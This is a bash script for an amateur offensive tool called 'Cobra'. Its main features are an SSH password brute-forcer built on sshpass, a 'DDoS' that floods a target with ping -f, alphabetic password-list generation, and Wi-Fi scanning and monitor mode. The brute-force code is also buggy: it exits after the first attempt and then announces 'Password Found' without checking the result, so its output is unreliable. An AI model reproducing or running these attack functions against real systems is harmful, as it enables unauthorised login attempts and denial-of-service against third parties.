#!/bin/bash
#Help Start#
if [[ $EUID -ne 0 ]]; then
echo "Run It As Root."
echo $( date ) " Tried To Run As User, '$USER' with ID, '$EUID'" >> $HOME/cobra_errors.log
exit 1
else
#Begin Everything Normally (Inside The If Statement That Checks For Root#
help()
{
#b
#d
#G
#g
#h
#m
#s
#V
echo ""
echo "Cobra v0.1 alpha ( https://github.com/54m/cobra )"
echo "			"
echo "Syntax: cobra (-b) (-d server) (-G) (-g outputfile) (-h) (-m) (-s) (-V)"
echo "			"
echo "Options:"
echo "  -b		Bruteforce SSH Passwords. (beta) Adding More Functionality Soon."
echo "  -d		Start a DDoS Attack Using Ping. Ex: cobra -d myip.com"
echo "  -G		Use Text-Based GUI (Recommended For Users Afraid Of Cmd Line)"
echo "  -g		Used To Generate Password List.  Ex: cobra -g $HOME/pass.txt"
echo "  -m		Simply Puts Your Wi-Fi Card Into Monitor Mode"
echo "  -s		Scans And Displays All Access Points In Range"
echo "  -V		Print Version Number"
echo "  -h		Displays This Help Text"
echo "  OPT		some arguments accept additional input"
echo "" #Add discription
echo "			"

}
#Help End#

#Scan Start#
scan()
{
if [[ $EUID -ne 0 ]]; then ###This Is Checking To See If You Are Root (ne is ≠)###
   echo "You Need To Be Root To Run A Scan"
   echo $( date ) ": Tried To Run Scan As $USER with ID $EUID" >> $HOME/cobra_errors.log
   exit 1
else
echo "[*]		Starting Scan..."
sleep 0.2
echo "[*]		Disconnecting..."
airport -z
echo "[*]		Success..."
echo "[*]		Scanning..."
airport -s && echo "[*]			Scan Complete"
fi
}
#Scan End#

#Monitor Mode Start#
monmode()
{
echo -n "Monitor Mode Will Disconnect You From LAN. Continue? (y/n)"
read answer
if [ $answer = "n" ]; then
echo "[*]		Exiting..."
exit 1
else
echo "[*]		Initializing..."
echo "[*]		Disconnecting..."
airport -z > /dev/null 2>&1 && echo "[*]		Disconnected..."
echo "[*]		Monitor Mode Activate (^C To Terminate)"
airport sniff > /dev/null 2>&1 && echo "[*]		Monitor Mode Terminated"
echo "[*]		Cleaning Up..."
cd /tmp
find . -type f -name "*.cap" -exec rm -f {} \; > /dev/null 2>&1 
echo "[*]		All Done"
fi
}
#Monitor End#

brute() #Bruteforce Script...MY BRUTEFORCE PROGRAM
{
clear
echo "Use The BruteForce Option To BruteForce ssh Only. More Functionality Will Be Added Soon!"
echo "

"
echo -n "Enter Server IP: "
read server
echo -n "Specify Password List File: "
read passlist
echo -n "Specify User To Use: "
read uuser
count=$(cat $passlist|wc -l) #Counts lines (number of repeats we need to go through)
for password in `cat $passlist`
#until [ STATUS = "0" ];
do
#It is going to repeat all the lines of the file using the lines of the file until it's done.
# doing something everytime (in this case, opening ssh and trying the password)
echo "[*]		Trying PASSWORD:$password   LOGIN:$uuser"
brutessh
#if [ $STATUS = "0" ]; then
#break
#echo "[*]		Password Found! LOGIN:$uuser PASSWORD:$password"
#exit 0
#fi
done
echo "[*]		Password Found! LOGIN:$uuser PASSWORD:$password"
}
#END BRUTEFORCE SCRIPT

#SSH BRUTE FORCEING FUNCTION###

brutessh()
{
#If there isnt sshpass enable this manually. Why Didn't You Install in Config!
#This logs in with the stuff...
#expect -f "
#spawn ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 $uuser@$server
#expect "Password:"
#send "$password\\r"
#exit
#"
sshpass -p $password ssh -q -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 $uuser@$server >/dev/null 
STATUS=$?
exit;

}


#END SSH BRUTEFORCE FUNCITON

#Password Gen Script###

passgen()
{
echo -n "Enter Password Size (1-6): "
read size
echo -n "This Could Take A While...Are Sure You Want To Create Password File At $file?(y/n)"
read go
if [ $go = "n" ]; then
exit 0;
else
case $size in
1) echo "[*]		Creating Password List (1)–(The Alphabet)..."
	echo {a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
2) echo "[*]		Creating Password List (2)..."
	echo {a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
3) echo "[*]		Creating Password List (3)..."
	echo {a..z}{a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
4) echo "[*]		Creating Password List (4)..."
	echo {a..z}{a..z}{a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
5) echo "[*]		Creating Password List (5)..."
	echo {a..z}{a..z}{a..z}{a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
6) echo "[*]		Creating Password List (6)..."
echo {a..z}{a..z}{a..z}{a..z}{a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
esac
fi
}

#END PASSWORD GEN####

#Password Gen GUI###

passgengui()
{
clear #One Difference
echo -n "Specify Output File: "
read file
echo -n "Enter Password Size (1-6): "
read size
echo -n "This Could Take A While...Are Sure You Want To Create Password File At $file? (y/n)"
read go
if [ $go = "n" ]; then
exit 0;
else
case $size in #Add Nice [*]		Things Like This To The Stuff Below For The GUI
1) echo "[*]		Creating Password List (1)–(The Alphabet)..."
	echo {a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
2) echo "[*]		Creating Password List (2)..."
	echo {a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
3) echo "[*]		Creating Password List (3)..."
	echo {a..z}{a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
4) echo "[*]		Creating Password List (4)..."
	echo {a..z}{a..z}{a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
5) echo "[*]		Creating Password List (5)..."
	echo {a..z}{a..z}{a..z}{a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
6) echo "[*]		Creating Password List (6)..."
echo {a..z}{a..z}{a..z}{a..z}{a..z}{a..z} >> $file && chmod +x $file && echo "[*]		All Done" ;;
esac
fi
}

#END PASSWORD GUI####


#-----------------GUI--------------#
gui()
{
selection=
clear
echo "

Cobra GUI Version 1.0"
echo "
"
#My MakeShift Menu Thing#
until [ "$selection" = "q" ]; do
echo "
    Cobra Options
    1 - Scan
    2 - Monitor Mode
    3 - DDoS Attack
    4 - Generate Passwords
	–––––––––––––––––
    q - exit program
"
echo -n "Enter A Selection Number: "
read selection
echo ""
case $selection in 
	1 ) scan ;;
	2 ) monmode ;;
	q ) exit ;;
	3 ) ddosgui ;;
	4 ) passgengui ;;
	* ) clear && echo "That's Not A Valid Option..."
	esac 
	done
}

#DDoS######
ddosgui()
{
echo -n "Enter An IP To Attack: "
read destination
echo "[*]		Initializing..."
echo "[*]		Starting DoS Attack...(^C To Terminate)"
sleep 1
ping -f $destination

}
#ddos command line with arguments
ddos()
{
echo "[*]		Initializing..."
echo "[*]		Starting DoS Attack...(^C To Terminate)"
sleep 1
ping -f -s 1000 $destination

}

#DDoS END#######

#INSTRUCTIONS

while getopts ":hsmGVbd:g:" CHOICE; do
case $CHOICE in
			h)
			#Start
			help
			#End
			shift
			exit 0;
;;
			G)
			gui
			
			#
;;

			V)
			echo "Cobra Ultimate Wireless Utility Tool. V0.2 Alpha"
			exit 0
;;
			s)
			scan
;;
			m)
			monmode

;;
			d)
			destination=$OPTARG
			ddos
;;
			b)
			brute
;;
			g)
			file=$OPTARG
			passgen
;;
			*)
			 help
			;;
esac
done
exit 0;
fi #Remember? We Check For Root At The Beggening

if [ $? -ne "0" ]
then
echo "Unknown Error. Did You Configure Properly?"
exit 1
fi

